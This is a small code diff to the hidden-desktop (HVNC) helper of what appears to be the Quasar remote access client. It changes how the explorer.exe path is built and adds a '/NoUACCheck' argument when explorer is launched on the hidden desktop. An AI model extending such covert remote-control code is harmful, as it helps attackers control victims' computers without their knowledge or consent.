@@ -173,7 +173,8 @@ namespace Quasar.Client.Helper.HVNC
                     }
                 }
             }
-            return this.CreateProc("C:\\Windows\\explorer.exe");
+            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
+            return this.CreateProc(explorerPath);
         }
 
         public bool CloseProc(string filePath)
